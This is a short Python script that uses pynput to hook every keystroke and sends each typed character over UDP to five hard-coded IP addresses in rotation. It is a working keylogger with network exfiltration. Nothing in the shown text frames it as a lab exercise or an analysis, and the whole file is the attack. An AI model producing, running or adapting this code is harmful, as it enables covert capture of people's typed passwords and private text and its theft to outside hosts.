from pynput.keyboard import Key, Listener
import socket

# No changes needed for the IPs, but ensure they are valid and within the correct range
ips = ["172.16.2.59", "123.45.67.89", "111.111.1.11", "97.35.6.32", "22.22.2.22"]
i = 0

def send_character_udp(ip, port, character):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:  # Notice SOCK_DGRAM for UDP
        s.sendto(character.encode(), (ip, port))

def on_press(key):
    global i  # Declare i as global to modify it
    try:
        print(f'Alphanumeric key pressed: {key.char}')
        send_character_udp(ips[i % len(ips)], 12345, key.char)
        i += 1

    except AttributeError:
        print(f'Special key pressed: {key}')

def on_release(key):
    print(f'Key released: {key}')
    # Optionally add a break condition here

# Collecting events until manually stopped
with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
